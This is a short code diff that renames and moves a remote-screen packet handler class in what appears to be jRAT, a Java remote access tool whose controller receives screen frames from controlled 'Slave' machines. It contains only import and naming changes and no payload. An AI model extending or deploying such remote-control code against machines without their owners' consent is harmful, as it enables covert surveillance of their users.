@@ -1,15 +1,20 @@
-package jrat.controller.packets.incoming;
+package jrat.module.screen.packets;
 
 import jrat.controller.Slave;
+import jrat.controller.packets.incoming.AbstractIncomingPacket;
 import jrat.controller.packets.outgoing.Packet12RemoteScreen;
-import jrat.controller.ui.frames.FrameRemoteScreen;
 import jrat.controller.utils.CursorUtils;
+import jrat.module.screen.ui.FrameRemoteScreen;
 
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
 
-public class Packet68RemoteScreenComplete extends AbstractIncomingPacket {
+/**
+ * Received when a frame has successfully transferred
+ * Will draw cursor and other optional graphics
+ */
+public class PacketRemoteScreenCompleted extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
